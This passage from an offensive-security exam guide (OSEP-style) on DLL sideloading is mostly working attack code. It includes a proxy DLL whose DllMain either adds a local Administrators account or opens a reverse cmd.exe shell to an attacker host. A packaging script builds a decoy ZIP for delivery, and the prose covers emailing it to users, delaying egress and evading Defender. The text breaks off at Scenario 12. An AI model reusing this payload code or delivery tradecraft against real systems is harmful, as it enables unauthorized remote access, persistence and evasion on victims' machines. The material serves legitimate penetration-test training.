::: warning Authorized use only
For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
:::

# 04 · DLL Sideloading

> Module: `M04` · Scenarios 11–12 · Based on: course chapter 6 (§6.1–6.2)
> Related cheat sheet keywords: `New Admin with C` / `DLL` / `Shellcode Inject`
> Prerequisites: Windows DLL search order, PE import/export tables, calling conventions.

## 0. Overview

| File | Purpose |
|---|---|
| `m04-proxy-dll-sideload.c` | Pure-forward Proxy DLL (forward all exports + keep the host healthy); also the “isolated control” build for scenario 12 |
| `m04-proxy-dll-newadmin.c` | Live build: create admin / reverse shell (compile-time `MODE` macro); same full export forwarding |
| `m04-proxy-dll-cpp.cpp` | C++ version + `.def` / name mangling / calling-convention notes (hand-written forward examples for a few functions) |
| `m04-build-sideload-package.py` | Pack host + Proxy DLL + renamed original DLL into a ZIP; validate PE architecture and file integrity |

One-line model: **when the host loads a DLL by bare filename, Windows searches the host EXE’s directory first**. Replace that same-named DLL with your Proxy; the Proxy forwards every export to the renamed original (`original.dll`). The host keeps working; your code still runs.

#### `m04-proxy-dll-sideload.c` {#m04-proxy-dll-sideload-c}

````c
/*
 * m04-proxy-dll-sideload.c
 *
 * Purpose: "Pure forward / no-payload control" Proxy for DLL sideloading.
 *       Compile to a DLL with the same name as the host's original DLL
 *       (e.g. legit.dll). Forward every export via forward.def to the
 *       renamed original in the same directory (original.dll) so the host
 *       keeps working. This file carries no payload — use it for scenario 12
 *       isolation: prove "forwarding is correct and the host does not crash"
 *       before swapping in the live m04-proxy-dll-newadmin.c.
 * Scenario: M04 · Scenario 11 (compatibility check) / Scenario 12 (first step
 *       when troubleshooting instant exit)
 * Dependencies: MinGW-w64 or MSVC; original DLL export list
 *       (objdump -p / dumpbin /exports)
 * Usage:
 *   # First generate forward.def from the export list (lines like
 *   # "Foo = original.Foo"; see doc §2)
 *   x86_64-w64-mingw32-gcc -shared -O2 -o legit.dll m04-proxy-dll-sideload.c forward.def
 *   strip legit.dll
 *   # MSVC: cl /LD m04-proxy-dll-sideload.c /Fe:legit.dll /link /DEF:forward.def
 * Placeholders: none (pure forward; no network/account actions). Debug macros
 *       in the file are off by default.
 * Test status: Not lab-tested (no target VM). Syntax and link style follow
 *   normal MinGW usage; on first use verify in a replica VM with
 *   "host + original.dll renamed beside it" that the host starts cleanly.
 */

#include <windows.h>

/*
 * In DLL_PROCESS_ATTACH do the minimum and return TRUE.
 * Rule: DllMain runs under the loader lock — no LoadLibrary, no waits,
 * no network I/O.
 * To confirm "our DLL really loaded" (local triage only; leaves artifacts
 * on a target): define DEBUG_LOADED to append a timestamp line to
 * %TEMP%\m04-sideload-loaded.txt.
 */
#ifdef DEBUG_LOADED
#include <stdio.h>
static void NoteLoaded(void)
{
    char path[MAX_PATH];
    FILE *f;
    if (!GetTempPathA(MAX_PATH, path))
        return;
    lstrcatA(path, "m04-sideload-loaded.txt");
    f = fopen(path, "a");
    if (f) {
        fprintf(f, "proxy loaded into pid %lu\n", GetCurrentProcessId());
        fclose(f);
    }
}
#endif

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    (void)hModule;
    (void)lpReserved;
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
#ifdef DEBUG_LOADED
        NoteLoaded();
#endif
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

/*
 * Optional rundll32 test entry: rundll32 legit.dll,Run verifies this DLL
 * can be loaded and called without the host (helps scenario 12 decide
 * "host environment vs DLL").
 * Note: in a real delivery package the DLL filename must be the name the
 * host loads — do not rely on this entry.
 */
__declspec(dllexport) void CALLBACK Run(HWND hwnd, HINSTANCE hinst,
                                        LPSTR lpszCmdLine, int nCmdShow)
{
    (void)hwnd; (void)hinst; (void)lpszCmdLine; (void)nCmdShow;
    /* Empty body: only proves load/call chain works */
}

/*
 * Note: all forwarded exports come from forward.def, not C declarations —
 * avoids hand-writing every signature (wrong signature = wrong calling
 * convention = scenario 12 crash).
 * If .def forwarding is unsupported on your toolchain (some old binutils):
 *   1) build with MSVC link.exe /DEF:forward.def;
 *   2) or use the "hand-write a few forwards" mode in m04-proxy-dll-cpp.cpp
 *      (when the function count is small).
 */
````

#### `m04-proxy-dll-newadmin.c` {#m04-proxy-dll-newadmin-c}

````c
/*
 * m04-proxy-dll-newadmin.c
 *
 * Purpose: "Live" Proxy for DLL sideloading — keep the host healthy via
 *       forwarding while running a payload. Two compile-time modes:
 *         MODE_NETUSER (default): create a local admin account (cheat sheet
 *                   "New Admin with C"), for hosts that run elevated;
 *         MODE_REVERSE: reverse TCP shell, for interactive sessions as a
 *                   normal user.
 *       All forwarded exports still come from forward.def (same as
 *       m04-proxy-dll-sideload.c).
 * Scenario: M04 · Scenario 11 (primary delivery payload); Scenario 12
 *       (attach payload only after forwarding is confirmed)
 * Dependencies: MinGW-w64 / MSVC; ws2_32, netapi32;
 *       forward.def (from original DLL exports; see docs/04-dll-sideloading.md)
 * Usage:
 *   Reverse mode (Kali cross-compile):
 *     x86_64-w64-mingw32-gcc -shared -O2 -o legit.dll m04-proxy-dll-newadmin.c forward.def \
 *       -lws2_32 -lnetapi32 -DMODE_REVERSE \
 *       -DLHOST=L\"10.0.0.5\" -DLPORT=L\"4444\"
 *   Add-admin mode:
 *     x86_64-w64-mingw32-gcc -shared -O2 -o legit.dll m04-proxy-dll-newadmin.c forward.def \
 *       -lnetapi32 -DMODE_NETUSER \
 *       -DADMIN_USER=L\"ExamUser\" -DADMIN_PASS=L\"ExamPass!23\"
 *   Rename the built DLL to the name the host loads (e.g. legit.dll) and
 *   place it in the host directory.
 * Placeholders: LHOST / LPORT (reverse target), USER / PASS (new account;
 *       defaults are placeholders — you must -D override before compile).
 *       Without -D override the target creates literal "USER"/"PASS"
 *       accounts — replace them for the exam.
 * Test status: Not lab-tested. Syntax follows MinGW-w64 norms; not verified
 *   on a target. First run the no-payload m04-proxy-dll-sideload.c through
 *   forwarding on a local VM, then compile this file to test payload only.
 */

#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0600
#endif
#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <lmaccess.h>
#include <lmerr.h>
#include <stdlib.h>

/* Auto-link for MSVC; MinGW needs -lws2_32 -lnetapi32 on the command line */
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "netapi32.lib")

#ifndef MODE_NETUSER
#ifndef MODE_REVERSE
#define MODE_NETUSER          /* default: add admin */
#endif
#endif

#ifndef LHOST
#define LHOST L"127.0.0.1"    /* placeholder — must override at compile time */
#endif
#ifndef LPORT
#define LPORT L"4444"
#endif
#ifndef ADMIN_USER
#define ADMIN_USER L"USER"    /* placeholder — must override at compile time */
#endif
#ifndef ADMIN_PASS
#define ADMIN_PASS L"PASS"
#endif

/* ---------- Mode 1: create local admin (cheat sheet: New Admin with C) ---------- */

static DWORD AddAdminUser(void)
{
    NET_API_STATUS rc;
    USER_INFO_1 ui;
    LOCALGROUP_MEMBERS_INFO_0 gm;
    SID_NAME_USE snu;
    BYTE sid[256];
    DWORD cbSid = sizeof(sid);
    DWORD cbDomain = sizeof(sid) / sizeof(WCHAR);
    WCHAR domain[256];

    ZeroMemory(&ui, sizeof(ui));
    ui.usri1_name        = (LPWSTR)ADMIN_USER;
    ui.usri1_password    = (LPWSTR)ADMIN_PASS;
    ui.usri1_priv        = USER_PRIV_USER;               /* cannot grant admin at create time */
    ui.usri1_flags       = UF_SCRIPT | UF_NORMAL_ACCOUNT;
    ui.usri1_script_path = NULL;

    rc = NetUserAdd(NULL, 1, (LPBYTE)&ui, NULL);         /* local server */
    if (rc != NERR_Success)
        return rc;

    if (!LookupAccountNameW(NULL, (LPWSTR)ADMIN_USER, sid, &cbSid,
                            domain, &cbDomain, &snu))
        return (DWORD)GetLastError();

    gm.lgrmi0_sid = (PSID)sid;
    rc = NetLocalGroupAddMembers(NULL, L"Administrators", 0, (LPBYTE)&gm, 1);
    return rc;
}

static DWORD WINAPI NetUserThread(LPVOID ctx)
{
    (void)ctx;
    AddAdminUser();
    return 0;
}

/* ---------- Mode 2: reverse TCP shell ---------- */

static DWORD WINAPI ReverseThread(LPVOID ctx)
{
    WSADATA wsa;
    SOCKET s = INVALID_SOCKET;
    struct sockaddr_in sa;
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    WCHAR cmdline[] = L"cmd.exe";

    (void)ctx;
    Sleep(2000);                                   /* let host UI appear first */
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
        return 1;

    s = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (s == INVALID_SOCKET)
        goto fail;

    sa.sin_family = AF_INET;
    sa.sin_port = htons((u_short)_wtoi(LPORT));
    if (InetPtonW(AF_INET, LHOST, &sa.sin_addr) != 1)
        goto fail;

    if (WSAConnect(s, (const struct sockaddr *)&sa, sizeof(sa),
                   NULL, NULL, NULL, NULL) != 0)
        goto fail;

    /* Make the socket handle inheritable as cmd's std handles */
    SetHandleInformation((HANDLE)s, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;

    ZeroMemory(&pi, sizeof(pi));
    if (!CreateProcessW(NULL, cmdline, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        goto fail;

    WaitForSingleObject(pi.hProcess, INFINITE);    /* keep socket until cmd exits */
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(s);
    WSACleanup();
    return 0;

fail:
    if (s != INVALID_SOCKET)
        closesocket(s);
    WSACleanup();
    return 1;
}

/* ---------- Entry ---------- */

static void LaunchPayload(void)
{
    HANDLE h;
#ifdef MODE_REVERSE
    h = CreateThread(NULL, 0, ReverseThread, NULL, 0, NULL);
#else
    h = CreateThread(NULL, 0, NetUserThread, NULL, 0, NULL);
#endif
    if (h != NULL)
        CloseHandle(h);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    (void)hModule;
    (void)lpReserved;
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        /* No heavy work/waits under the loader lock: only start a thread */
        LaunchPayload();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

/*
 * Standalone rundll32 test entry: rundll32 legit.dll,Run
 * Validates the payload without the host; during real sideloading DllMain
 * already fired — this entry is triage-only.
 */
__declspec(dllexport) void CALLBACK Run(HWND hwnd, HINSTANCE hinst,
                                        LPSTR lpszCmdLine, int nCmdShow)
{
    (void)hwnd; (void)hinst; (void)lpszCmdLine; (void)nCmdShow;
    LaunchPayload();
}
````

#### `m04-proxy-dll-cpp.cpp` {#m04-proxy-dll-cpp-cpp}

````cpp
// m04-proxy-dll-cpp.cpp
//
// Purpose: C++ Proxy example for DLL sideloading. Focuses on three points:
//   1) C++ exports must use extern "C" (otherwise names are mangled and the
//      host cannot resolve the original names);
//   2) Calling conventions: __stdcall vs __cdecl — decorated names (@N /
//      leading underscore) differ;
//   3) Role of the .def file, and trade-offs between static forwarding vs
//      hand-written forwarding (runtime GetProcAddress).
//      Static forwarding (.def: Foo = original.Foo) keeps original names and
//      conventions automatically — preferred;
//      The Forwarded wrappers here are only for "host calls a few functions
//      and you do not want a full .def" — kept as a contrast style.
// Scenario: M04 · Scenarios 11/12 (C++-shop isomorphic version; .def /
//      convention triage reference)
// Dependencies: MinGW-w64 g++ or MSVC; original DLL (renamed original.dll
//      in the same directory)
// Usage:
//   x86_64-w64-mingw32-g++ -shared -O2 -std=c++17 -o legit.dll \
//       m04-proxy-dll-cpp.cpp forward.def -lws2_32 -lnetapi32
//   MSVC: cl /LD m04-proxy-dll-cpp.cpp /Fe:legit.dll /link /DEF:forward.def
// Placeholders: no default payload; LHOST/LPORT notes are given — copy from
//      m04-proxy-dll-newadmin.c when needed.
// Test status: Not lab-tested (no target VM); syntax/link shape example only —
//      verify on a replica VM before use.

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <string>

#pragma comment(lib, "kernel32.lib")

// ---------------------------------------------------------------------------
// Name-mangling notes (clearest on x86 32-bit; x64 has no cdecl/stdcall split
// but still has C++ mangling):
//   C++ member/free functions export mangled names by default (?Foo@@YAHH@Z).
//   Avoid: wrap in extern "C"; or route everything through .def (.def names
//   become the export names as written).
//   In hand-written forwards, names/conventions must match the host imports,
//   e.g. on 32-bit:
//     __cdecl  int Foo(int)        -> _Foo
//     __stdcall int Foo(int)       -> _Foo@4
//   Write whatever name the host imports. Prefer .def static forwarding to
//   skip this entirely.
// ---------------------------------------------------------------------------

extern "C" {

// .def static-forward mode: this file only needs DllMain; all exports come
// from forward.def:
//   EXPORTS
//     Foo = original.Foo
//     Bar = original.Bar @7        ; keep @N for ordinal-only exports
// Those forwards make the loader load original.dll from the same directory
// and continue forwarding — host behavior unchanged.

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    (void)hModule; (void)lpReserved;
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        // Payload trigger: CreateThread only — no heavy work here
        // (loader-lock limits same as the .c version).
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

// ---------------------------------------------------------------------------
// Contrast style: hand-written forwarding (runtime). Use only when the
// original DLL exports few functions and you have every prototype. On first
// call, resolve from same-directory original.dll and cache.
// If the original exports dozens of functions, do not hand-write — use .def
// full forwarding.
// ---------------------------------------------------------------------------

namespace {

HMODULE g_original = nullptr;      // cached original.dll handle (lazy on first call)

HMODULE LoadOriginal()
{
    if (g_original == nullptr)
        g_original = LoadLibraryW(L"original.dll");
    return g_original;
}

} // namespace

// Example: host imports original.dll's __cdecl int Foo(int).
// Export name is controlled by .def (recommended: Foo = original.Foo). Without
// .def, if you use __declspec(dllexport), the export name of this signature
// must match the host import name.
__declspec(dllexport) int __cdecl Foo(int a)
{
    HMODULE h = LoadOriginal();
    if (h == nullptr)
        return -1;                 // fail soft if original.dll is missing — avoid host crash
    typedef int(__cdecl *FooFn)(int);
    FooFn fn = reinterpret_cast<FooFn>(GetProcAddress(h, "Foo"));
    return fn ? fn(a) : -1;
}

// Example: __stdcall with 2 args → export name _Bar@8 on 32-bit.
__declspec(dllexport) int __stdcall Bar(int a, int b)
{
    HMODULE h = LoadOriginal();
    if (h == nullptr)
        return -1;
    typedef int(__stdcall *BarFn)(int, int);
    BarFn fn = reinterpret_cast<BarFn>(GetProcAddress(h, "Bar"));
    return fn ? fn(a, b) : -1;
}

} // extern "C"

// ---------------------------------------------------------------------------
// Project advice:
//   * Prefer .def when available (original names/conventions/ordinals kept;
//     no need to worry about extern "C");
//   * One function per .def line; generate from the original DLL with
//     objdump -p / dumpbin /exports;
//   * Payload code (reverse / add-admin) is shared with the .c version —
//     port from m04-proxy-dll-newadmin.c into DllMain or a dedicated thread
//     function when needed.
// ---------------------------------------------------------------------------
````

#### `m04-build-sideload-package.py` {#m04-build-sideload-package-py}

````python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# m04-build-sideload-package.py
#
# Purpose: Build a DLL-sideload directory into a ZIP delivery package, with
#       consistency checks before packing:
#       - All PE files in the directory share one architecture (x86/x64;
#         mixed arch = instant crash = scenario 12);
#       - Both the "host-loaded DLL name" (proxy) and the "renamed original
#         DLL" must be present;
#       - Proxy export count aligns with the original (full forwarding keeps
#         the host alive; mismatch means forward.def missed exports — a main
#         crash cause).
#       Emits ZIP + SHA256 so you can verify integrity after delivery.
# Scenario: M04 · Scenario 11 pre-delivery prep / Scenario 12 export-forward
#       self-check
# Dependencies: Python 3 stdlib (no pefile); directory holds built host + DLLs
# Usage:
#   python3 m04-build-sideload-package.py \
#       --input-dir ./sideload --dll-name legit.dll --original-name original.dll \
#       --out sideload-pkg.zip
#   Expected layout (packed as-is under a <top-dir> folder):
#     sideload/
#       RunHost.exe     host (original, untouched)
#       legit.dll       proxy (built and renamed to the host-loaded name;
#                       set by --dll-name)
#       original.dll    original legit.dll renamed as the forward target
#       other files/dirs  decoys to keep a business-looking tree
# Placeholders: none (filenames come from arguments)
# Test status: Not lab-tested; PE parsing follows the standard layout
#   (MZ->PE->optional header->export directory). Run --dry-run style checks
#   on a replica VM with a real host/original DLL before delivery.

import argparse
import hashlib
import os
import struct
import sys
import zipfile

MACHINE = {0x14C: "x86 (PE32)", 0x8664: "x64 (PE32+)", 0x1C0: "ARM", 0xAA64: "ARM64"}
EXP_DIR_IDX = 0  # IMAGE_DIRECTORY_ENTRY_EXPORT

class PeInfo(object):
    def __init__(self, path, arch, n_exports):
        self.path = path
        self.arch = arch            # 0x14C / 0x8664 / None
        self.n_exports = n_exports  # named export count (proxy/original should both have values)

    def __repr__(self):
        return "%s arch=%s exports=%d" % (
            os.path.basename(self.path),
            MACHINE.get(self.arch, "unknown(0x%X)" % self.arch) if self.arch else "not-PE",
            self.n_exports)

def _u16(buf, off):
    return struct.unpack_from("<H", buf, off)[0]

def _u32(buf, off):
    return struct.unpack_from("<I", buf, off)[0]

def _read_cstr(buf, off):
    end = buf.find(b"\x00", off)
    return buf[off:end].decode("latin-1", "replace") if end != -1 else ""

def parse_pe(path):
    """Return (arch_machine, n_export_names); raise ValueError if not PE / parse fails."""
    with open(path, "rb") as f:
        buf = f.read()
    if buf[:2] != b"MZ":
        raise ValueError("no MZ header")
    pe = _u32(buf, 0x3C)
    if pe + 6 > len(buf) or buf[pe:pe + 4] != b"PE\x00\x00":
        raise ValueError("no PE signature")
    arch = _u16(buf, pe + 4)
    n_sec = _u16(buf, pe + 6)
    opt_size = _u16(buf, pe + 20)
    opt = pe + 24
    magic = _u16(buf, opt)
    if magic == 0x10B:
        dd_base = opt + 96           # PE32 data directories offset
    elif magic == 0x20B:
        dd_base = opt + 112          # PE32+ data directories offset
    else:
        raise ValueError("unknown optional header magic 0x%X" % magic)

    sections = []
    sec = opt + opt_size
    for i in range(n_sec):
        s = sec + i * 40
        sections.append((_u32(buf, s + 12),     # VirtualAddress
                         _u32(buf, s + 8),      # VirtualSize
                         _u32(buf, s + 20),     # PointerToRawData
                         _u32(buf, s + 16)))    # SizeOfRawData

    def rva2off(rva):
        for va, vs, raw, size in sections:
            if va <= rva < va + max(vs, size):
                off = raw + (rva - va)
                if 0 <= off < len(buf):
                    return off
        return None

    n_names = 0
    exp_rva = _u32(buf, dd_base + 8 * EXP_DIR_IDX)
    exp_off = rva2off(exp_rva) if exp_rva else None
    if exp_off is not None:
        n_names = _u32(buf, exp_off + 24)          # NumberOfNames
        names_rva = _u32(buf, exp_off + 32)        # AddressOfNames (RVA table)
        base = rva2off(names_rva)
        if base is not None:
            for i in range(min(n_names, 64)):      # spot-check first 64 names are readable
                no = rva2off(_u32(buf, base + i * 4))
                if no is None or not _read_cstr(buf, no):
                    raise ValueError("export name table corrupt")
    return arch, n_names

def main(argv):
    ap = argparse.ArgumentParser(description="Build & validate a DLL sideload ZIP package")
    ap.add_argument("--input-dir", required=True, help="Directory: host + proxy DLL + renamed original + decoys")
    ap.add_argument("--dll-name", required=True, help="DLL filename the host actually loads (= proxy name)")
    ap.add_argument("--original-name", default="original.dll", help="Original DLL after rename")
    ap.add_argument("--out", default="sideload-pkg.zip", help="Output ZIP")
    ap.add_argument("--top-dir", default="", help="Top folder name inside ZIP (default <input dirname>-pkg)")
    args = ap.parse_args(argv)

    indir = args.input_dir
    if not os.path.isdir(indir):
        print("[-] input dir not found: %s" % indir)
        return 1
    top = args.top_dir or (os.path.basename(os.path.abspath(indir)) + "-pkg")

    ppe = os.path.join(indir, args.dll_name)
    porig = os.path.join(indir, args.original_name)
    if not os.path.isfile(ppe):
        print("[-] proxy DLL missing (host-loaded name): %s" % ppe)
        return 1
    if not os.path.isfile(porig):
        print("[-] renamed original DLL missing: %s" % porig)
        return 1

    # 1) All PE architectures in the directory must match
    arch0 = None
    for name in sorted(os.listdir(indir)):
        p = os.path.join(indir, name)
        if os.path.isdir(p):
            continue
        try:
            arch, _ = parse_pe(p)
        except ValueError:
            print("[!] skip non-PE file: %s" % name)
            continue
        if arch not in MACHINE:
            print("[!] skip unknown-arch PE: %s" % name)
            continue
        if arch0 is None:
            arch0 = arch
            print("[*] PE arch baseline: %s" % MACHINE[arch])
        elif arch != arch0:
            print("[-] arch mismatch: %s is %s, baseline is %s" % (
                name, MACHINE.get(arch, hex(arch)), MACHINE[arch0]))
            return 1

    # 2) Proxy vs original export counts align (full-forward check)
    _, n_proxy = parse_pe(ppe)
    _, n_orig = parse_pe(porig)
    print("[*] %s exports=%d | %s exports=%d" % (
        args.dll_name, n_proxy, args.original_name, n_orig))
    if n_proxy == 0:
        print("[-] proxy exports 0 names: forward.def did not take effect or is empty; host will crash on missing imports")
        return 1
    if n_proxy != n_orig:
        print("[!] export count mismatch (%d != %d): forward.def missed or has extra exports; "
              "host may crash — compare export tables with dumpbin/objdump" % (n_proxy, n_orig))

    # 3) Pack: wrap under top folder, keep relative structure
    with zipfile.ZipFile(args.out, "w", zipfile.ZIP_DEFLATED) as z:
        for root, dirs, files in os.walk(indir):
            dirs.sort()
            for name in sorted(files):
                full = os.path.join(root, name)
                rel = os.path.relpath(full, indir)
                z.write(full, os.path.join(top, rel))
    sha = hashlib.sha256(open(args.out, "rb").read()).hexdigest()
    print("[+] wrote %s (%d bytes) sha256=%s" % (args.out, os.path.getsize(args.out), sha))
    print("[*] manual checks before delivery: 1) on a replica VM, unzip and double-click the host — "
          "it should start normally and the payload should fire; 2) ProcMon confirms Load Image hits top/%s; "
          "3) version matches the target" % args.dll_name)
    return 0

if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
````

## 1. Core concepts (memorize these four)

1. **Search order (SafeDllSearchMode on by default)**: host EXE directory → System32 → System16 → Windows → current directory → PATH. Sideloading works when the host loads the DLL by **bare name or relative path** (e.g. `LoadLibrary("updater.dll")`). If the host uses an **absolute path** into System32, or the target is in KnownDLLs / restricted by `SetDllDirectory`, this path is closed (→ failure branch 2).
2. **Sideload ≠ Hijack**: Sideloading targets a DLL that was **supposed** to load from the host directory (usually a private, benign DLL) — we just place a same-named file first. Hijack replaces a system DLL that should load from System32. OSEP scenario 11 is the former: files go in the host directory, and the host must still start normally.
3. **Host imports resolve at load time**: if `host.exe`'s import table has `legit.dll:Foo`, the loader must find `Foo` in our DLL's export table — **missing export = process never starts (classic “instant exit”)**. So the Proxy either forwards every export or implements every function the host actually calls.
4. **Architecture and bitness must match**: an x86 host can only load an x86 Proxy (load failure = crash); calling-convention mismatch (stdcall/cdecl) crashes on the **first call**. `.def` static forwarding **naturally keeps original names and conventions**, so prefer it over hand-written implementations.

Forwarding mechanism: at link time a `.def` writes each export as `Foo = original.Foo`; when resolving that export the loader **automatically loads same-directory `original.dll`** and continues forwarding. The Proxy only keeps `DllMain` (+ payload thread) and does not need every function signature.

## 2. Scenario 11: User opens a program from a ZIP, but macro/script entry points are unavailable

### Situation
Deliver a ZIP; the user extracts and runs the (signed) program inside; that program loads a same-directory DLL. Macros, scripts, HTML, and similar entries are all unavailable — the only execution surface is this DLL sideload. Deliver a directory package that “runs, does not crash the host, and carries a payload.”

### Assumptions
- Host program name and **exact version** are known (export tables change by version; wrong version = crash).
- Host truly loads the same-directory DLL by bare/relative name (verify once with ProcMon on a local VM).
- Target allows the program to run (it is a whitelisted “allowed to start” binary; AppLocker/AV does not block the host; **our unsigned DLL** may still be scanned → OPSEC section).
- User runs as a normal user: payload defaults to user rights; if the host has a `requireAdministrator` manifest or is launched as SYSTEM by a scheduled task, the payload elevates automatically (see Verify).

### Prepare (attacker side)
1. **Lock host version and architecture** (once on the target / replica VM):
   - Architecture: `file RunHost.exe` (PE32=x86 / PE32+=x64); on Windows `dumpbin /headers RunHost.exe | findstr machine`.
   - Version: file Properties → Details, or version resources in `dumpbin /headers`. **Record the version**; only that version goes in the package.
   - Confirm the sideload point: ProcMon filter `Process Name = RunHost.exe` + `Operation = Load Image`, find entries whose `Path` ends in `.dll` and sits beside `RunHost.exe` — those are candidates. If the target DLL actually loads from System32 (Result path under `C:\Windows\System32`), the host used an absolute path — pick another candidate.
2. **Export the full original-DLL list** (drives `.def` contents):
   - Kali: `x86_64-w64-mingw32-objdump -p original.dll | sed -n '/Export Name Pointer Table/,/Ordinal Hint Table/p'` for names; `file original.dll` for arch.
   - Windows: `dumpbin /exports original.dll` (ordinals + RVAs; watch for **ordinal-only exports** and exported variables).
3. **Generate forward `.def`** (same directory as sources; name is free, e.g. `forward.def`):
   ```
   EXPORTS
     Foo = original.Foo
     Bar = original.Bar
     ; keep ordinal for ordinal-only exports:
     Baz = original.Baz @12
   ```
   Bulk generate (Linux; replace `original.dll` with the renamed filename):
   ```bash
   printf 'EXPORTS\n' > forward.def
   x86_64-w64-mingw32-objdump -p original.dll \
     | sed -n '/Export Name Pointer Table/,/Ordinal Hint Table/p' \
     | grep -o '"[^"]*"' | tr -d '"' \
     | sed 's/.*/& = original.&/' >> forward.def
   ```
4. **Compile the Proxy** (either toolchain; `.def` supplies all exports; source only provides `DllMain`/payload):
   - MinGW (build directly on Kali/attacker):
     ```bash
     # x64
     x86_64-w64-mingw32-gcc -shared -O2 -o legit.dll m04-proxy-dll-newadmin.c forward.def \
       -lws2_32 -lnetapi32 -DUNICODE -D_UNICODE -DMODE_REVERSE
     # x86 (when the host is 32-bit)
     i686-w64-mingw32-gcc -shared -O2 -o legit.dll m04-proxy-dll-newadmin.c forward.def \
       -lws2_32 -lnetapi32 -DUNICODE -D_UNICODE -DMODE_REVERSE
     strip legit.dll
     ```
   - MSVC (build on replica VM): `cl /LD m04-proxy-dll-newadmin.c /Fe:legit.dll /link /DEF:forward.def ws2_32.lib netapi32.lib`
5. **Directory package layout** (user double-clicks the host after extract):
   ```
   sideload/
   ├─ RunHost.exe      ← original host, untouched
   ├─ legit.dll        ← our Proxy (filename = name the host loads)
   ├─ original.dll     ← original legit.dll renamed (forward target)
   └─ readme.txt / data files  ← decoys so the tree looks like a normal install
   ```
6. **Pack and validate** (automatic architecture consistency check): `m04-build-sideload-package.py` (below). Put the ZIP on the attacker HTTP service and open the listener:
   - Reverse mode: `nc -lvnp LPORT`
   - Add-admin mode: no listener needed; verify later with `net localgroup administrators`.

### Steps
1. Deliver the ZIP (email / web download); guide the user to “extract and run `RunHost.exe`.”
2. User double-clicks → host starts normally (window appears = first proof of successful Proxy forwarding) → payload thread fires.
   - Reverse mode: payload `CreateThread`s the reverse thread from `DllMain` (**do not block in DllMain**; see scenario 12); attacker receives a shell within seconds.
   - Add-admin mode: `NetUserAdd` + `NetLocalGroupAddMembers` from the payload path.
3. Keep the host alive: payload is a background thread; host keeps running (optionally `Sleep(3000)` before connect so the UI appears first — looks more like a normal program).
4. After the shell, enumerate / escalate per process (default user rights); confirm context with `whoami` first.

### Scripts used
- `m04-proxy-dll-newadmin.c` (live; compile commands above)
- `m04-build-sideload-package.py` (pack + arch check)
- `m04-proxy-dll-sideload.c` (no-payload control during triage; see scenario 12)

### Verify
- Reverse: listener gets a connection, `whoami` works; host window still up (`tasklist | findstr RunHost`).
- Add-admin: `net localgroup administrators` shows the new user; host process alive.
- No-payload control (`m04-proxy-dll-sideload.c`) works on a **replica VM** = Proxy forwarding is correct; swapping the live build only needs payload triage.
- Privilege assertion: run the same program from an elevated prompt and compare `whoami` integrity level; if the host elevates via manifest, the payload is High Integrity (→ admin actions are available directly).

### Failure branches and alternatives
1. **Host version mismatch / incomplete export list** → missing import = crash. Fix: take the **same-version** original DLL from the target, regenerate `.def` with `objdump -p`; verify on a replica VM with that version before delivery.
2. **DLL actually loads from System32 (absolute path / KnownDLLs)** → sideload point invalid. Alt: re-capture with ProcMon; switch to a DLL that loads by bare name from the host directory; if none, fall back to another entry (this package only covers the DLL line).
3. **Architecture mismatch** (Proxy built x64, host is x86) → rebuild with the matching `i686-` / `x86_64-` prefix; recheck with `file`.
4. **AV/Defender blocks “unsigned DLL sideloading”** (`EnableSideloading` defenses) → check local `Get-MpComputerStatus`/policy first; alt: sign the Proxy with a test cert, change payload timing (delay + decoy traffic), or change payload shape (forward-only, then in-memory methods after the shell lands).
5. **User rights too low and host is not elevated** → you get a restricted user; follow normal privilege escalation — do not hard-code admin actions into the payload (OSEP scenarios often provide an escalatable environment).

### Exam notes / OPSEC
- Mix decoy files into the directory and **preserve host function** (window normal, business normal) so users/admins are less likely to notice anomalies.
- Delay reverse connect 2–5 seconds before starting the thread — avoid “double-click then immediate egress” behavior; never do heavy work in DllMain (blocking under the loader lock = guaranteed crash).
- Repeated tests leave fingerprints: dropping the same DLL many times on one VM helps behavior engines cluster samples — change names/delays between tests.
- Cleanup after: `del legit.dll original.dll` + delete the ZIP (delete later if the host is still open); avoid leaving suspiciously named new users in `Administrators` (remove after the exam).
- Defender sideload ASR rules (e.g. “Block executable files from running unless they meet a prevalence, age, or trusted list criteria”) may flag this pattern — validate on a small scope before bulk delivery.

## 3. Scenario 12: DLL is loaded, but the program exits immediately

### Situation
The sideload point itself works and the target ran the program, but the program **exits as soon as it starts**, so later stages never run. Root cause is usually not “payload was detected,” but a **broken contract between Proxy DLL and host**: import resolution failure / DllMain crash / calling-convention mismatch.

### Assumptions
